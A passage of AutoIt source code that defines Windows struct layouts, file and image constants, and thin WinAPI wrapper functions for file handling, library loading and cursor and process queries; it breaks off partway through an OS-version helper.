Global Const $gdip_coloradjusttype_pen = 3
Global Const $gdip_coloradjusttype_text = 4
Global Const $gdip_coloradjusttype_count = 5
Global Const $gdip_coloradjusttype_any = 6
Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $tagsize = "struct;long X;long Y;endstruct"
Global Const $tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $tagfiletime = "struct;dword Lo;dword Hi;endstruct"
Global Const $tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
Global Const $tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
Global Const $tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
Global Const $tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
Global Const $tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
Global Const $tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $taggdip_effectparams_blur = "float Radius; bool ExpandEdge"
Global Const $taggdip_effectparams_brightnesscontrast = "int BrightnessLevel; int ContrastLevel"
Global Const $taggdip_effectparams_colorbalance = "int CyanRed; int MagentaGreen; int YellowBlue"
Global Const $taggdip_effectparams_colorcurve = "int Adjustment; int Channel; int AdjustValue"
Global Const $taggdip_effectparams_colorlut = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
Global Const $taggdip_effectparams_huesaturationlightness = "int HueLevel; int SaturationLevel; int LightnessLevel"
Global Const $taggdip_effectparams_levels = "int Highlight; int Midtone; int Shadow"
Global Const $taggdip_effectparams_redeyecorrection = "uint NumberOfAreas; ptr Areas"
Global Const $taggdip_effectparams_sharpen = "float Radius; float Amount"
Global Const $taggdip_effectparams_tint = "int Hue; int Amount"
Global Const $taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $taggdipcolormatrix = "float m[25]"
Global Const $taggdipencoderparam = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
Global Const $taggdipencoderparams = "uint Count;" & $taggdipencoderparam
Global Const $taggdiprectf = "struct;float X;float Y;float Width;float Height;endstruct"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $taggdippencoderparams = "uint Count;byte Params[1]"
Global Const $taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
Global Const $tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
Global Const $taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $tagnmipaddress = $tagnmhdr & ";int Field;int Value"
Global Const $taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
Global Const $taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartID;int iStateID;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
Global Const $tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
Global Const $tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
Global Const $tagnmlvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
Global Const $tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
Global Const $tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
Global Const $tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $tagnmtckeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
Global Const $tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $tagnmtvitemchange = $tagnmhdr & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
Global Const $tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
Global Const $tagnmtvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
Global Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
Global Const $tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? "" : ";" & $tagrect & ";uint uChevronState")
Global Const $tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
Global Const $tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
Global Const $tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
Global Const $tagtbbutton = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
Global Const $tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $tagbitmapinfoheader = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
Global Const $tagbitmapinfo = $tagbitmapinfoheader & ";dword biRGBQuad[1]"
Global Const $tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $tagguid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
Global Const $tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $taglogfont = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
Global Const $tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"
Global Const $coinit_apartmentthreaded = 2
Global Const $coinit_disable_ole1dde = 4
Global Const $coinit_multithreaded = 0
Global Const $coinit_speed_over_memory = 8
Global Const $fc_nooverwrite = 0
Global Const $fc_overwrite = 1
Global Const $fc_createpath = 8
Global Const $ft_modified = 0
Global Const $ft_created = 1
Global Const $ft_accessed = 2
Global Const $ft_array = 0
Global Const $ft_string = 1
Global Const $fsf_createbutton = 1
Global Const $fsf_newdialog = 2
Global Const $fsf_editcontrol = 4
Global Const $ft_nonrecursive = 0
Global Const $ft_recursive = 1
Global Const $fo_read = 0
Global Const $fo_append = 1
Global Const $fo_overwrite = 2
Global Const $fo_createpath = 8
Global Const $fo_binary = 16
Global Const $fo_unicode = 32
Global Const $fo_utf16_le = 32
Global Const $fo_utf16_be = 64
Global Const $fo_utf8 = 128
Global Const $fo_utf8_nobom = 256
Global Const $fo_ansi = 512
Global Const $fo_utf16_le_nobom = 1024
Global Const $fo_utf16_be_nobom = 2048
Global Const $fo_utf8_full = 16384
Global Const $fo_fullfile_detect = 16384
Global Const $eof = -1
Global Const $fd_filemustexist = 1
Global Const $fd_pathmustexist = 2
Global Const $fd_multiselect = 4
Global Const $fd_promptcreatenew = 8
Global Const $fd_promptoverwrite = 16
Global Const $create_new = 1
Global Const $create_always = 2
Global Const $open_existing = 3
Global Const $open_always = 4
Global Const $truncate_existing = 5
Global Const $invalid_set_file_pointer = -1
Global Const $file_begin = 0
Global Const $file_current = 1
Global Const $file_end = 2
Global Const $file_attribute_readonly = 1
Global Const $file_attribute_hidden = 2
Global Const $file_attribute_system = 4
Global Const $file_attribute_directory = 16
Global Const $file_attribute_archive = 32
Global Const $file_attribute_device = 64
Global Const $file_attribute_normal = 128
Global Const $file_attribute_temporary = 256
Global Const $file_attribute_sparse_file = 512
Global Const $file_attribute_reparse_point = 1024
Global Const $file_attribute_compressed = 2048
Global Const $file_attribute_offline = 4096
Global Const $file_attribute_not_content_indexed = 8192
Global Const $file_attribute_encrypted = 16384
Global Const $file_share_read = 1
Global Const $file_share_write = 2
Global Const $file_share_delete = 4
Global Const $file_share_readwrite = BitOR($file_share_read, $file_share_write)
Global Const $file_share_any = BitOR($file_share_read, $file_share_write, $file_share_delete)
Global Const $generic_all = 268435456
Global Const $generic_execute = 536870912
Global Const $generic_write = 1073741824
Global Const $generic_read = -2147483648
Global Const $generic_readwrite = BitOR($generic_read, $generic_write)
Global Const $file_encoding_utf16le = 32
Global Const $fe_entire_utf8 = 1
Global Const $fe_partialfirst_utf8 = 2
Global Const $fn_fullpath = 0
Global Const $fn_relativepath = 1
Global Const $fv_comments = "Comments"
Global Const $fv_companyname = "CompanyName"
Global Const $fv_filedescription = "FileDescription"
Global Const $fv_fileversion = "FileVersion"
Global Const $fv_internalname = "InternalName"
Global Const $fv_legalcopyright = "LegalCopyright"
Global Const $fv_legaltrademarks = "LegalTrademarks"
Global Const $fv_originalfilename = "OriginalFilename"
Global Const $fv_productname = "ProductName"
Global Const $fv_productversion = "ProductVersion"
Global Const $fv_privatebuild = "PrivateBuild"
Global Const $fv_specialbuild = "SpecialBuild"
Global Const $frta_nocount = 0
Global Const $frta_count = 1
Global Const $frta_intarrays = 2
Global Const $frta_entiresplit = 4
Global Const $flta_filesfolders = 0
Global Const $flta_files = 1
Global Const $flta_folders = 2
Global Const $fltar_filesfolders = 0
Global Const $fltar_files = 1
Global Const $fltar_folders = 2
Global Const $fltar_nohidden = 4
Global Const $fltar_nosystem = 8
Global Const $fltar_nolink = 16
Global Const $fltar_norecur = 0
Global Const $fltar_recur = 1
Global Const $fltar_nosort = 0
Global Const $fltar_sort = 1
Global Const $fltar_fastsort = 2
Global Const $fltar_nopath = 0
Global Const $fltar_relpath = 1
Global Const $fltar_fullpath = 2
Global Const $path_original = 0
Global Const $path_drive = 1
Global Const $path_directory = 2
Global Const $path_filename = 3
Global Const $path_extension = 4
#Region Global Variables and Constants
	Global $__g_venum, $__g_vext = 0
	Global $__g_irgbmode = 1
	Global Const $tagosversioninfo = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
	Global Const $image_bitmap = 0
	Global Const $image_icon = 1
	Global Const $image_cursor = 2
	Global Const $image_enhmetafile = 3
	Global Const $lr_defaultcolor = 0
	Global Const $lr_monochrome = 1
	Global Const $lr_color = 2
	Global Const $lr_copyreturnorg = 4
	Global Const $lr_copydeleteorg = 8
	Global Const $lr_loadfromfile = 16
	Global Const $lr_loadtransparent = 32
	Global Const $lr_defaultsize = 64
	Global Const $lr_vgacolor = 128
	Global Const $lr_loadmap3dcolors = 4096
	Global Const $lr_createdibsection = 8192
	Global Const $lr_copyfromresource = 16384
	Global Const $lr_shared = 32768
	Global Const $__tagcursorinfo = "dword Size;dword Flags;handle hCursor;" & "struct;long X;long Y;endstruct"
	Global Const $__winver = __winver()
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_createfile($sfilename, $icreation, $iaccess = 4, $ishare = 0, $iattributes = 0, $tsecurity = 0)
		Local $ida = 0, $ism = 0, $icd = 0, $ifa = 0
		If BitAND($iaccess, 1) <> 0 Then $ida = BitOR($ida, $generic_execute)
		If BitAND($iaccess, 2) <> 0 Then $ida = BitOR($ida, $generic_read)
		If BitAND($iaccess, 4) <> 0 Then $ida = BitOR($ida, $generic_write)
		If BitAND($ishare, 1) <> 0 Then $ism = BitOR($ism, $file_share_delete)
		If BitAND($ishare, 2) <> 0 Then $ism = BitOR($ism, $file_share_read)
		If BitAND($ishare, 4) <> 0 Then $ism = BitOR($ism, $file_share_write)
		Switch $icreation
			Case 0
				$icd = $create_new
			Case 1
				$icd = $create_always
			Case 2
				$icd = $open_existing
			Case 3
				$icd = $open_always
			Case 4
				$icd = $truncate_existing
		EndSwitch
		If BitAND($iattributes, 1) <> 0 Then $ifa = BitOR($ifa, $file_attribute_archive)
		If BitAND($iattributes, 2) <> 0 Then $ifa = BitOR($ifa, $file_attribute_hidden)
		If BitAND($iattributes, 4) <> 0 Then $ifa = BitOR($ifa, $file_attribute_readonly)
		If BitAND($iattributes, 8) <> 0 Then $ifa = BitOR($ifa, $file_attribute_system)
		Local $aresult = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilename, "dword", $ida, "dword", $ism, "struct*", $tsecurity, "dword", $icd, "dword", $ifa, "ptr", 0)
		If @error OR ($aresult[0] = Ptr(-1)) Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_freelibrary($hmodule)
		Local $aresult = DllCall("kernel32.dll", "bool", "FreeLibrary", "handle", $hmodule)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_getcursorinfo()
		Local $tcursor = DllStructCreate($__tagcursorinfo)
		Local $icursor = DllStructGetSize($tcursor)
		DllStructSetData($tcursor, "Size", $icursor)
		Local $aret = DllCall("user32.dll", "bool", "GetCursorInfo", "struct*", $tcursor)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $acursor[5]
		$acursor[0] = True
		$acursor[1] = DllStructGetData($tcursor, "Flags") <> 0
		$acursor[2] = DllStructGetData($tcursor, "hCursor")
		$acursor[3] = DllStructGetData($tcursor, "X")
		$acursor[4] = DllStructGetData($tcursor, "Y")
		Return $acursor
	EndFunc

	Func _winapi_getdlgctrlid($hwnd)
		Local $aresult = DllCall("user32.dll", "int", "GetDlgCtrlID", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getmodulehandle($smodulename)
		Local $smodulenametype = "wstr"
		If $smodulename = "" Then
			$smodulename = 0
			$smodulenametype = "ptr"
		EndIf
		Local $aresult = DllCall("kernel32.dll", "handle", "GetModuleHandleW", $smodulenametype, $smodulename)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getstring($pstring, $bunicode = True)
		Local $ilength = _winapi_strlen($pstring, $bunicode)
		If @error OR NOT $ilength Then Return SetError(@error + 10, @extended, "")
		Local $tstring = DllStructCreate(($bunicode ? "wchar" : "char") & "[" & ($ilength + 1) & "]", $pstring)
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($ilength, DllStructGetData($tstring, 1))
	EndFunc

	Func _winapi_iswow64process($ipid = 0)
		If NOT $ipid Then $ipid = @AutoItPID
		Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ($__winver < 1536 ? 1024 : 4096), "bool", 0, "dword", $ipid)
		If @error OR NOT $hprocess[0] Then Return SetError(@error + 20, @extended, False)
		Local $aret = DllCall("kernel32.dll", "bool", "IsWow64Process", "handle", $hprocess[0], "bool*", 0)
		If __checkerrorclosehandle($aret, $hprocess[0]) Then Return SetError(@error, @extended, False)
		Return $aret[2]
	EndFunc

	Func _winapi_loadimage($hinstance, $simage, $itype, $ixdesired, $iydesired, $iload)
		Local $aresult, $simagetype = "int"
		If IsString($simage) Then $simagetype = "wstr"
		$aresult = DllCall("user32.dll", "handle", "LoadImageW", "handle", $hinstance, $simagetype, $simage, "uint", $itype, "int", $ixdesired, "int", $iydesired, "uint", $iload)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_loadlibrary($sfilename)
		Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $sfilename)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_pathisdirectory($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsDirectoryW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_readfile($hfile, $pbuffer, $itoread, ByRef $iread, $toverlapped = 0)
		Local $aresult = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $pbuffer, "dword", $itoread, "dword*", 0, "struct*", $toverlapped)
		If @error Then Return SetError(@error, @extended, False)
		$iread = $aresult[4]
		Return $aresult[0]
	EndFunc

	Func _winapi_strlen($pstring, $bunicode = True)
		Local $w = ""
		If $bunicode Then $w = "W"
		Local $aret = DllCall("kernel32.dll", "int", "lstrlen" & $w, "struct*", $pstring)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_switchcolor($icolor)
		If $icolor = -1 Then Return $icolor
		Return BitOR(BitAND($icolor, 65280), BitShift(BitAND($icolor, 255), -16), BitShift(BitAND($icolor, 16711680), 16))
	EndFunc

	Func _winapi_writefile($hfile, $pbuffer, $itowrite, ByRef $iwritten, $toverlapped = 0)
		Local $aresult = DllCall("kernel32.dll", "bool", "WriteFile", "handle", $hfile, "struct*", $pbuffer, "dword", $itowrite, "dword*", 0, "struct*", $toverlapped)
		If @error Then Return SetError(@error, @extended, False)
		$iwritten = $aresult[4]
		Return $aresult[0]
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __checkerrorarraybounds(Const ByRef $adata, ByRef $istart, ByRef $iend, $ndim = 1, $idim = $ubound_dimensions)
		If NOT IsArray($adata) Then Return SetError(1, 0, 1)
		If UBound($adata, $idim) <> $ndim Then Return SetError(2, 0, 1)
		If $istart < 0 Then $istart = 0
		Local $iubound = UBound($adata) - 1
		If $iend < 1 OR $iend > $iubound Then $iend = $iubound
		If $istart > $iend Then Return SetError(4, 0, 1)
		Return 0
	EndFunc

	Func __checkerrorclosehandle($aret, $hfile, $blasterror = False, $icurerr = @error, $icurext = @extended)
		If NOT $icurerr AND NOT $aret[0] Then $icurerr = 10
		Local $alasterror = DllCall("kernel32.dll", "dword", "GetLastError")
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		If $icurerr Then DllCall("kernel32.dll", "none", "SetLastError", "dword", $alasterror[0])
		If $blasterror Then $icurext = $alasterror[0]
		Return SetError($icurerr, $icurext, $icurerr)
	EndFunc

	Func __dll($spath, $bpin = False)
		Local $aret = DllCall("kernel32.dll", "bool", "GetModuleHandleExW", "dword", ($bpin ? 1 : 2), "wstr", $spath, "ptr*", 0)
		If NOT $aret[3] Then
			Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $spath)
			If NOT $aresult[0] Then Return 0
		EndIf
		Return 1
	EndFunc

	Func __enumwindowsproc($hwnd, $bvisible)
		Local $aresult
		If $bvisible Then
			$aresult = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
			If NOT $aresult[0] Then
				Return 1
			EndIf
		EndIf
		__inc($__g_venum)
		$__g_venum[$__g_venum[0][0]][0] = $hwnd
		$aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
		$__g_venum[$__g_venum[0][0]][1] = $aresult[2]
		Return 1
	EndFunc

	Func __fatalexit($icode, $stext = "")
		If $stext Then MsgBox($mb_systemmodal, "AutoIt", $stext)
		DllCall("kernel32.dll", "none", "FatalExit", "int", $icode)
	EndFunc

	Func __inc(ByRef $adata, $iincrement = 100)
		Select 
			Case UBound($adata, $ubound_columns)
				If $iincrement < 0 Then
					ReDim $adata[$adata[0][0] + 1][UBound($adata, $ubound_columns)]
				Else
					$adata[0][0] += 1
					If $adata[0][0] > UBound($adata) - 1 Then
						ReDim $adata[$adata[0][0] + $iincrement][UBound($adata, $ubound_columns)]
					EndIf
				EndIf
			Case UBound($adata, $ubound_rows)
				If $iincrement < 0 Then
					ReDim $adata[$adata[0] + 1]
				Else
					$adata[0] += 1
					If $adata[0] > UBound($adata) - 1 Then
						ReDim $adata[$adata[0] + $iincrement]
					EndIf
				EndIf
			Case Else
				Return 0
		EndSelect
		Return 1
	EndFunc

	Func __rgb($icolor)
		If $__g_irgbmode Then
			$icolor = _winapi_switchcolor($icolor)
		EndIf
		Return $icolor
	EndFunc

	Func __winver()
		Local $tosvi = DllStructCreate($tagosversioninfo)
		DllStructSetData($tosvi, 1, DllStructGetSize($tosvi))
		Local $aret = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosvi)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
